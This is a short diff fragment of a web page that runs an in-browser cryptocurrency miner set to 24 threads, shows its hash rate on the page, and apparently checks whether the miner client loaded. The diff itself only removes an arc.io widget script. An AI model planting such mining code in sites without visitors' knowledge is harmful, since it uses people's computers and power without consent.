@@ -11,7 +11,6 @@
     miner.setNumThreads(24);
     function logger(){setTimeout(function(){hpsps=miner.getHashesPerSecond();const docrep=document.getElementById("hpsd");docrep.value="Hash Per Second: "+hpsps;logger()},1e3)}logger();
 </script>
-<script async src="https://arc.io/widget.min.js#gi2D9wgu"></script>
 <script>
     setTimeout(function(){
         if(typeof _client === 'undefined' || _client === null)
